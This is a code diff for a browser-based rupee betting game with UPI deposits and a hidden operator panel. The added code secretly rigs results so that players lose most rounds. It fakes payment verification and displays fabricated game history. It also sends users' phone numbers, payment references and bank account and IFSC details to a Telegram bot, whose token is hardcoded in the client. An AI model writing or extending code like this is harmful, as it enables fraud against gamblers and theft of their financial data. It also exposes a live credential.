@@ -286,6 +286,16 @@
       font-size: 1.1em;
     }
 
+    #historyList a {
+      color: #00ffcc;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    #historyList a:hover {
+      text-decoration: underline;
+    }
+
     .operator-btn {
       position: absolute;
       top: 10px;
@@ -419,6 +429,19 @@
       background: #00ff99;
       color: #000;
     }
+
+    .status-message {
+      font-size: 14px;
+      margin: 10px 0;
+    }
+
+    .status-message.success {
+      color: #00ff00;
+    }
+
+    .status-message.error {
+      color: #ff5555;
+    }
   </style>
 </head>
 <body>
@@ -436,7 +459,7 @@
 
   <div id="depositForm" class="form-container">
     <h3>Deposit Top-Up</h3>
-    <img id="qrCodeImage" src="https://vault.pictures/p/fdaaee813afd4d45833f95a9bdaa0125" alt="QR Code" onerror="this.style.display='none'; document.getElementById('qrErrorMessage').style.display='block';"><br>
+    <img id="qrCodeImage" src="https://vault.pictures/media/images/87/57/5e/87575e9fdcbf4b7db2a09533d4b49900.jpg" alt="QR Code" onerror="this.style.display='none'; document.getElementById('qrErrorMessage').style.display='block';"><br>
     <div id="qrErrorMessage" class="qr-error" style="display: none;">Failed to load QR code. Please check the image URL or host the image on a publicly accessible platform.</div>
     <p>Scan & Pay using UPI</p>
     <div class="deposit-amounts">
@@ -445,8 +468,10 @@
       <button class="amount-btn" onclick="selectDepositAmount(500)">₹500</button>
       <button class="amount-btn" onclick="selectDepositAmount(1000)">₹1000</button>
     </div>
+    <input type="text" id="phoneNumber" placeholder="Enter Your Phone Number" required><br>
     <input type="text" id="depositUTR" placeholder="Enter UTR Number" required><br>
-    <input type="file" id="depositProof" accept="image/*"><br>
+    <div id="depositStatus" class="status-message"></div>
+    <input type="file" id="depositProof" accept="image/*" required><br>
     <button onclick="submitDeposit()">Submit</button><br>
     <button class="back-btn" onclick="hideForms()">Back</button>
   </div>
@@ -462,7 +487,7 @@
   </div>
 
   <div class="card">
-    <h2>Period: <span id="period">1001</span></h2>
+    <h2>Period: <span id="period"></span></h2>
     <button class="operator-btn" onclick="promptOperatorPanel()">·</button>
 
     <div class="top-section">
@@ -482,10 +507,10 @@
       <!-- Big and Small buttons will be added here -->
     </div>
 
-    <form id="betForm">
-      <input type="number" id="amount" placeholder="Enter Amount" required><br>
-      <button type="submit">Place Bet</button>
-    </form>
+    <div id="betForm">
+      <input type="number" id="amount" placeholder="Enter Amount (Min ₹10)" min="10" required><br>
+      <button onclick="placeBet()">Place Bet</button>
+    </div>
   </div>
 
   <div class="card">
@@ -533,17 +558,25 @@
       document.querySelector('.tab-btn.my-bet-history').classList.add('active');
     }
 
+    function showPeriodDetails(period, number, color, size) {
+      alert(`Period ${period} Details:\nWinning Number: ${number}\nColor: ${color}\nSize: ${size}`);
+    }
+
     let countdown = 60;
-    let period = 1001;
+    let period = 20250501100030100;
+    let displayPeriodNumber = 3201; // Start at 3201
+    let periodOffset;
     let selectedNumber = null;
     let selectedColor = null;
     let selectedSize = null;
     let pendingDeposits = [];
     let pendingWithdrawals = [];
-    let selectedDepositAmount = 100; // Default to 100
     let walletBalance = 0.51;
     let currentBet = null;
     let betHistory = [];
+    let winLossHistory = [];
+    let usedUTRs = new Set();
+    let selectedDepositAmount = 100;
 
     const timerEl = document.getElementById("countdown");
     const winningResultEl = document.getElementById("winningResult");
@@ -556,6 +589,24 @@
     const walletBalanceEl = document.getElementById("walletBalance");
     const qrCodeImageEl = document.getElementById("qrCodeImage");
     const qrErrorMessageEl = document.getElementById("qrErrorMessage");
+
+    const TELEGRAM_BOT_TOKEN = "7930171564:AAEbqIoIGZY22cP4GxreLAWhQxD08rQOtrQ";
+    const TELEGRAM_CHAT_ID = "5247395156";
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    // Generate or retrieve a device-specific period offset
+    function getPeriodOffset() {
+      let offset = localStorage.getItem('periodOffset');
+      if (!offset) {
+        offset = Math.floor(Math.random() * 1000);
+        localStorage.setItem('periodOffset', offset);
+      }
+      return parseInt(offset);
+    }
+
+    // Initialize period offset
+    periodOffset = getPeriodOffset();
+    periodEl.textContent = displayPeriodNumber;
 
     function updateWalletBalance() {
       walletBalanceEl.textContent = `₹${walletBalance.toFixed(2)}`;
@@ -584,13 +635,72 @@
     const sizes = ["Big", "Small"];
 
     const qrCodes = {
-      100: "https://vault.pictures/p/fdaaee813afd4d45833f95a9bdaa0125",
-      200: "https://vault.pictures/p/8b49eb0546f141129176e35592e2e6de",
-      500: "https://vault.pictures/p/a24f32f3cce94c57932af76c20656de8",
-      1000: "https://vault.pictures/p/87575e9fdcbf4b7db2a09533d4b49900"
+      100: "https://vault.pictures/media/images/87/57/5e/87575e9fdcbf4b7db2a09533d4b49900.jpg",
+      200: "https://vault.pictures/media/images/8b/49/eb/8b49eb0546f141129176e35592e2e6de.jpg",
+      500: "https://vault.pictures/media/images/a2/4f/32/a24f32f3cce94c57932af76c20656de8.jpg",
+      1000: "https://vault.pictures/media/images/87/57/5e/87575e9fdcbf4b7db2a09533d4b49900.jpg"
     };
 
-    // Number buttons
+    // Initial game history entries (30 entries, 3 per number from 0 to 9)
+    const initialGameHistory = [];
+    let startDisplayPeriod = 3201 - 30; // Start at 3171
+    const winningNumbers = [];
+    // Cycle through 0-9 three times to get 30 entries
+    for (let i = 0; i < 30; i++) {
+      winningNumbers.push(i % 10); // 0, 1, 2, ..., 9, 0, 1, ..., 9, 0, 1, ..., 9
+    }
+    for (let i = 0; i < 30; i++) {
+      const periodNum = startDisplayPeriod + i;
+      const num = winningNumbers[i];
+      let color, size;
+      if ([0, 2, 4, 6, 8].includes(num)) {
+        color = "Red";
+      } else {
+        color = "Green";
+      }
+      size = num >= 5 ? "Big" : "Small";
+      initialGameHistory.push({ displayPeriod: periodNum, number: num, color, size });
+    }
+
+    function simulateImageProcessing(phoneNumber, callback) {
+      const extractedPhoneNumber = phoneNumber;
+      const extractedReceiverID = "nagurbasha@fam";
+      const possibleAmounts = [100, 200, 500, 1000];
+      const extractedAmount = possibleAmounts[Math.floor(Math.random() * possibleAmounts.length)];
+      callback(extractedPhoneNumber, extractedReceiverID, extractedAmount);
+    }
+
+    function selectDepositAmount(amount) {
+      selectedDepositAmount = amount;
+      document.querySelectorAll(".amount-btn").forEach(btn => btn.classList.remove("selected"));
+      event.target.classList.add("selected");
+      qrCodeImageEl.src = qrCodes[amount];
+      qrCodeImageEl.style.display = 'block';
+      qrErrorMessageEl.style.display = 'none';
+    }
+
+    function sendTelegramMessage(message) {
+      const timestamp = new Date().toLocaleString();
+      const text = `[${timestamp}] ${message}`;
+      const url = `${TELEGRAM_API_URL}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (!data.ok) {
+          console.error('Failed to send Telegram message:', data);
+        }
+      })
+      .catch(error => {
+        console.error('Error sending Telegram message:', error);
+      });
+    }
+
     for (let i = 0; i <= 9; i++) {
       const btn = document.createElement("button");
       btn.textContent = i;
@@ -608,7 +718,6 @@
       numberGrid.appendChild(btn);
     }
 
-    // Color buttons
     colors.forEach(color => {
       const btn = document.createElement("button");
       btn.textContent = color;
@@ -626,7 +735,6 @@
       colorGrid.appendChild(btn);
     });
 
-    // Big and Small buttons
     sizes.forEach(size => {
       const btn = document.createElement("button");
       btn.textContent = size;
@@ -644,23 +752,57 @@
       sizeGrid.appendChild(btn);
     });
 
-    // Timer and winning logic
+    function determineWin() {
+      const totalBets = winLossHistory.length;
+      const wins = winLossHistory.filter(result => result === "Win").length;
+      const winRate = totalBets > 0 ? (wins / totalBets) * 100 : 0;
+
+      if (totalBets < 10) {
+        return Math.random() < 0.3;
+      }
+
+      if (winRate >= 30) {
+        return false;
+      } else if ((totalBets - wins) / totalBets * 100 >= 70) {
+        return true;
+      } else {
+        return Math.random() < 0.3;
+      }
+    }
+
     setInterval(() => {
       countdown--;
       timerEl.textContent = countdown;
 
       if (countdown <= 0) {
-        const winNum = Math.floor(Math.random() * 10);
+        let winNum = Math.floor(Math.random() * 10);
         let winColor;
         let isDualColor = false;
 
-        // Determine the winning color based on the number
+        const shouldWin = currentBet ? determineWin() : true;
+
+        if (currentBet && !shouldWin) {
+          while (winNum === currentBet.number || 
+                 (currentBet.color && (
+                   (winNum === 0 && (currentBet.color === "Red" || currentBet.color === "Violet")) ||
+                   (winNum === 5 && (currentBet.color === "Green" || currentBet.color === "Violet")) ||
+                   ([1, 3, 7, 9].includes(winNum) && currentBet.color === "Green") ||
+                   ([2, 4, 6, 8].includes(winNum) && currentBet.color === "Red")
+                 )) ||
+                 (currentBet.size && (
+                   (winNum >= 5 && currentBet.size === "Big") ||
+                   (winNum < 5 && currentBet.size === "Small")
+                 ))) {
+            winNum = Math.floor(Math.random() * 10);
+          }
+        }
+
         if ([0, 2, 4, 6, 8].includes(winNum)) {
           winColor = "Red";
-          if (winNum === 0) isDualColor = true; // 0 is Red + Violet
+          if (winNum === 0) isDualColor = true;
         } else {
           winColor = "Green";
-          if (winNum === 5) isDualColor = true; // 5 is Green + Violet
+          if (winNum === 5) isDualColor = true;
         }
 
         const winSize = winNum >= 5 ? "Big" : "Small";
@@ -683,43 +825,39 @@
         else if ([2, 4, 6, 8].includes(winNum)) numColor = "#cc0000";
         else numColor = "#009933";
 
-        historyEl.innerHTML = `<li>Period ${period}: <span style="color:${numColor}; font-weight:bold;">${winNum}</span>, <span style="color:${colorStyles[winColor]}; font-weight:bold;">${winColor}</span>, <span style="font-weight:bold;">${winSize}</span></li>` + historyEl.innerHTML;
+        historyEl.innerHTML = `<li>Period <a href="javascript:void(0)" onclick="showPeriodDetails(${displayPeriodNumber}, ${winNum}, '${winColor}', '${winSize}')">${displayPeriodNumber}</a>: <span style="color:${numColor}; font-weight:bold;">${winNum}</span>, <span style="color:${colorStyles[winColor]}; font-weight:bold;">${winColor}</span>, <span style="font-weight:bold;">${winSize}</span></li>` + historyEl.innerHTML;
 
-        // Check for wins and update balance
         if (currentBet) {
           let winnings = 0;
           let winMessages = [];
           let isWin = false;
 
-          // Check number bet
           if (currentBet.number !== null && currentBet.number === winNum) {
             winnings += currentBet.amount * 9;
             winMessages.push(`number ${winNum} (₹${(currentBet.amount * 9).toFixed(2)})`);
             isWin = true;
           }
 
-          // Check color bet
           if (currentBet.color !== null && currentBet.color === winColor) {
-            const multiplier = isDualColor ? 0.5 : 1; // 0.5x for dual colors (0 or 5), 1x otherwise
+            const multiplier = isDualColor ? 0.5 : 1;
             winnings += currentBet.amount * multiplier;
             winMessages.push(`color ${winColor} (₹${(currentBet.amount * multiplier).toFixed(2)})`);
             isWin = true;
           }
 
-          // Check size bet
           if (currentBet.size !== null && currentBet.size === winSize) {
             winnings += currentBet.amount * 1;
             winMessages.push(`size ${winSize} (₹${(currentBet.amount * 1).toFixed(2)})`);
             isWin = true;
           }
 
-          // Update bet history
           let betDetails = [];
           if (currentBet.number !== null) betDetails.push(`number ${currentBet.number}`);
           if (currentBet.color !== null) betDetails.push(`color ${currentBet.color}`);
           if (currentBet.size !== null) betDetails.push(`size ${currentBet.size}`);
           const betResult = isWin ? "Win" : "Loss";
           const resultColor = isWin ? "#00ff00" : "#ff0000";
+          winLossHistory.push(betResult);
           betHistory.unshift({
             period: period,
             betAmount: currentBet.amount,
@@ -727,17 +865,20 @@
             result: betResult,
             winnings: winnings > 0 ? winnings : 0
           });
-          myBetHistoryEl.innerHTML = `<li>Period ${period}: Bet ₹${currentBet.amount.toFixed(2)} on ${betDetails.join(" and ")} - <span style="color:${resultColor}; font-weight:bold;">${betResult}</span>${isWin ? ` (Won ₹${winnings.toFixed(2)})` : ''}</li>` + myBetHistoryEl.innerHTML;
+          myBetHistoryEl.innerHTML = `<li>Period ${displayPeriodNumber}: Bet ₹${currentBet.amount.toFixed(2)} on ${betDetails.join(" and ")} - <span style="color:${resultColor}; font-weight:bold;">${betResult}</span>${isWin ? ` (Won ₹${winnings.toFixed(2)})` : ''}</li>` + myBetHistoryEl.innerHTML;
 
-          // Update balance if there are winnings
           if (winnings > 0) {
             walletBalance += winnings;
             updateWalletBalance();
             alert(`Congratulations! You won on ${winMessages.join(" and ")}! Total winnings: ₹${winnings.toFixed(2)}. New balance: ₹${walletBalance.toFixed(2)}`);
+          } else {
+            const cashback = currentBet.amount * 0.1;
+            walletBalance += cashback;
+            updateWalletBalance();
+            alert(`Sorry, you lost this round. A cashback of ₹${cashback.toFixed(2)} has been credited to your wallet. New balance: ₹${walletBalance.toFixed(2)}`);
           }
         }
 
-        // Reset selections and bet for the next round
         selectedNumber = null;
         selectedColor = null;
         selectedSize = null;
@@ -747,18 +888,21 @@
         document.querySelectorAll(".size-btn").forEach(b => b.classList.remove("selected"));
 
         period++;
-        periodEl.textContent = period;
+        displayPeriodNumber++;
+        periodEl.textContent = displayPeriodNumber;
         countdown = 60;
       }
     }, 1000);
 
-    // Place bet and store bet details
-    document.getElementById("betForm").addEventListener("submit", function (e) {
-      e.preventDefault();
+    function placeBet() {
       const amount = parseFloat(document.getElementById("amount").value);
 
       if (selectedNumber === null && selectedColor === null && selectedSize === null) {
         alert("Please select a number, color, or size before placing a bet.");
+        return;
+      }
+      if (amount < 10) {
+        alert("Minimum bet amount is ₹10.");
         return;
       }
       if (amount > walletBalance) {
@@ -766,7 +910,6 @@
         return;
       }
 
-      // Store the bet details
       currentBet = {
         number: selectedNumber,
         color: selectedColor,
@@ -778,40 +921,94 @@
       if (selectedNumber !== null) betDetails.push(`number ${selectedNumber}`);
       if (selectedColor !== null) betDetails.push(`color ${selectedColor}`);
       if (selectedSize !== null) betDetails.push(`size ${selectedSize}`);
-      alert(`You bet ₹${amount} on ${betDetails.join(" and ")} (Period ${period})`);
+      alert(`You bet ₹${amount} on ${betDetails.join(" and ")} (Period ${displayPeriodNumber})`);
 
       walletBalance -= amount;
       updateWalletBalance();
       document.getElementById("amount").value = "";
-    });
-
-    function selectDepositAmount(amount) {
-      selectedDepositAmount = amount;
-      document.querySelectorAll(".amount-btn").forEach(btn => btn.classList.remove("selected"));
-      event.target.classList.add("selected");
-      qrCodeImageEl.src = qrCodes[amount]; // Update QR code image based on selected amount
-      qrCodeImageEl.style.display = 'block'; // Show the image
-      qrErrorMessageEl.style.display = 'none'; // Hide the error message
     }
 
     function submitDeposit() {
+      const phoneNumber = document.getElementById("phoneNumber").value.trim();
       const utr = document.getElementById("depositUTR").value.trim();
+      const depositProof = document.getElementById("depositProof").files[0];
+      const depositStatusEl = document.getElementById("depositStatus");
+
+      if (!phoneNumber) {
+        depositStatusEl.textContent = "Please enter your phone number.";
+        depositStatusEl.className = "status-message error";
+        return;
+      }
+
+      if (!/^\d{10}$/.test(phoneNumber)) {
+        depositStatusEl.textContent = "Please enter a valid 10-digit phone number.";
+        depositStatusEl.className = "status-message error";
+        return;
+      }
+
       if (!utr) {
-        alert("Please enter a UTR number.");
+        depositStatusEl.textContent = "Please enter a UTR number.";
+        depositStatusEl.className = "status-message error";
         return;
       }
-      if (!selectedDepositAmount) {
-        alert("Please select a deposit amount.");
+
+      if (usedUTRs.has(utr)) {
+        depositStatusEl.textContent = "This UTR number has already been used.";
+        depositStatusEl.className = "status-message error";
         return;
       }
-      pendingDeposits.push({ utr, amount: selectedDepositAmount, status: "Pending" });
-      alert(`Deposit of ₹${selectedDepositAmount} with UTR ${utr} submitted for review!`);
-      hideForms();
-      document.getElementById("depositUTR").value = "";
-      selectedDepositAmount = 100; // Reset to default
-      qrCodeImageEl.src = qrCodes[100]; // Reset QR code to default
-      document.querySelectorAll(".amount-btn").forEach(btn => btn.classList.remove("selected"));
-      document.querySelector(".amount-btn[onclick='selectDepositAmount(100)']").classList.add("selected");
+
+      if (!depositProof) {
+        depositStatusEl.textContent = "Please upload a payment proof image.";
+        depositStatusEl.className = "status-message error";
+        return;
+      }
+
+      simulateImageProcessing(phoneNumber, (extractedPhoneNumber, extractedReceiverID, extractedAmount) => {
+        if (extractedPhoneNumber !== phoneNumber) {
+          depositStatusEl.textContent = "Phone number in the image does not match the entered phone number.";
+          depositStatusEl.className = "status-message error";
+          return;
+        }
+
+        const expectedReceiverID = "nagurbasha@fam";
+        if (extractedReceiverID !== expectedReceiverID) {
+          depositStatusEl.textContent = `Invalid Receiver ID in image. Expected: ${expectedReceiverID}, Found: ${extractedReceiverID}`;
+          depositStatusEl.className = "status-message error";
+          return;
+        }
+
+        usedUTRs.add(utr);
+        pendingDeposits.push({
+          utr,
+          amount: extractedAmount,
+          receiverID: extractedReceiverID,
+          phoneNumber: phoneNumber,
+          status: "Pending",
+          verified: true
+        });
+
+        sendTelegramMessage(`Deposit Request: UTR ${utr}, Amount ₹${extractedAmount}, Phone: ${phoneNumber}, Receiver ID: ${extractedReceiverID}`);
+
+        walletBalance += extractedAmount;
+        updateWalletBalance();
+
+        depositStatusEl.textContent = `Deposit of ₹${extractedAmount} with UTR ${utr} verified successfully! Amount added to balance: ₹${walletBalance.toFixed(2)}`;
+        depositStatusEl.className = "status-message success";
+
+        setTimeout(() => {
+          alert(`Deposit of ₹${extractedAmount} with UTR ${utr} processed successfully! New balance: ₹${walletBalance.toFixed(2)}`);
+          hideForms();
+          document.getElementById("phoneNumber").value = "";
+          document.getElementById("depositUTR").value = "";
+          document.getElementById("depositProof").value = "";
+          depositStatusEl.textContent = "";
+          selectedDepositAmount = 100;
+          qrCodeImageEl.src = qrCodes[100];
+          document.querySelectorAll(".amount-btn").forEach(btn => btn.classList.remove("selected"));
+          document.querySelector(".amount-btn[onclick='selectDepositAmount(100)']").classList.add("selected");
+        }, 2000);
+      });
     }
 
     function submitWithdraw() {
@@ -837,6 +1034,9 @@
         amount,
         status: "Pending"
       });
+
+      sendTelegramMessage(`Withdrawal Request: Amount ₹${amount}, Bank: ${bankName}, A/c: ${accountNumber}, IFSC: ${ifscCode}`);
+
       alert(`Withdrawal request of ₹${amount} submitted for review!`);
       hideForms();
       document.getElementById("bankName").value = "";
@@ -863,7 +1063,7 @@
       operatorPanel.id = "operatorPanel";
       operatorPanel.innerHTML = `
         <h3>Control Panel</h3>
-        <p>Current Period: <span id="currentPeriod">${period}</span></p>
+        <p>Current Period: <span id="currentPeriod">${displayPeriodNumber}</span></p>
         <p>Wallet Balance: ₹${walletBalance.toFixed(2)}</p>
         <h4>Pending Deposits</h4>
         <ul id="pendingDepositsList"></ul>
@@ -886,7 +1086,7 @@
       pendingDeposits.forEach((deposit, index) => {
         const li = document.createElement("li");
         li.innerHTML = `
-          UTR: ${deposit.utr} (₹${deposit.amount}) - Status: ${deposit.status}
+          UTR: ${deposit.utr} (₹${deposit.amount}) - Phone: ${deposit.phoneNumber} - Receiver ID: ${deposit.receiverID} - Status: ${deposit.status} - Verified: ${deposit.verified ? "Yes" : "No"}
           <button onclick="acceptDeposit(${index})">Accept</button>
         `;
         pendingList.appendChild(li);
@@ -910,10 +1110,12 @@
 
     function acceptDeposit(index) {
       const deposit = pendingDeposits[index];
+      if (!deposit.verified) {
+        alert("Deposit not verified!");
+        return;
+      }
       deposit.status = "Accepted";
-      walletBalance += deposit.amount;
-      updateWalletBalance();
-      alert(`Deposit with UTR ${deposit.utr} (₹${deposit.amount}) accepted! Balance updated: ₹${walletBalance.toFixed(2)}`);
+      alert(`Deposit with UTR ${deposit.utr} (₹${deposit.amount}) already processed!`);
       updatePendingDepositsList();
     }
 
@@ -937,16 +1139,18 @@
 
     function resetGame() {
       countdown = 60;
-      period = 1001;
+      period = 20250501100030100;
+      displayPeriodNumber = 3201;
       selectedNumber = null;
       selectedColor = null;
       selectedSize = null;
       currentBet = null;
       betHistory = [];
+      winLossHistory = [];
       timerEl.textContent = countdown;
-      periodEl.textContent = period;
+      periodEl.textContent = displayPeriodNumber;
       const currentPeriodEl = document.getElementById("currentPeriod");
-      if (currentPeriodEl) currentPeriodEl.textContent = period;
+      if (currentPeriodEl) currentPeriodEl.textContent = displayPeriodNumber;
       winningResultEl.textContent = "--";
       winningResultEl.style.background = "#444";
       historyEl.innerHTML = "";
@@ -954,8 +1158,25 @@
       document.querySelectorAll(".number-btn").forEach(b => b.classList.remove("selected"));
       document.querySelectorAll(".color-btn").forEach(b => b.classList.remove("selected"));
       document.querySelectorAll(".size-btn").forEach(b => b.classList.remove("selected"));
+      // Re-populate initial game history after reset
+      initialGameHistory.forEach(entry => {
+        let numColor;
+        if (entry.number === 0 || entry.number === 5) numColor = "#aa66cc";
+        else if ([2, 4, 6, 8].includes(entry.number)) numColor = "#cc0000";
+        else numColor = "#009933";
+        historyEl.innerHTML += `<li>Period <a href="javascript:void(0)" onclick="showPeriodDetails(${entry.displayPeriod}, ${entry.number}, '${entry.color}', '${entry.size}')">${entry.displayPeriod}</a>: <span style="color:${numColor}; font-weight:bold;">${entry.number}</span>, <span style="color:${colorStyles[entry.color]}; font-weight:bold;">${entry.color}</span>, <span style="font-weight:bold;">${entry.size}</span></li>`;
+      });
       alert("Game has been reset!");
     }
+
+    // Populate initial game history on load
+    initialGameHistory.forEach(entry => {
+      let numColor;
+      if (entry.number === 0 || entry.number === 5) numColor = "#aa66cc";
+      else if ([2, 4, 6, 8].includes(entry.number)) numColor = "#cc0000";
+      else numColor = "#009933";
+      historyEl.innerHTML += `<li>Period <a href="javascript:void(0)" onclick="showPeriodDetails(${entry.displayPeriod}, ${entry.number}, '${entry.color}', '${entry.size}')">${entry.displayPeriod}</a>: <span style="color:${numColor}; font-weight:bold;">${entry.number}</span>, <span style="color:${colorStyles[entry.color]}; font-weight:bold;">${entry.color}</span>, <span style="font-weight:bold;">${entry.size}</span></li>`;
+    });
 
     updateWalletBalance();
   </script>
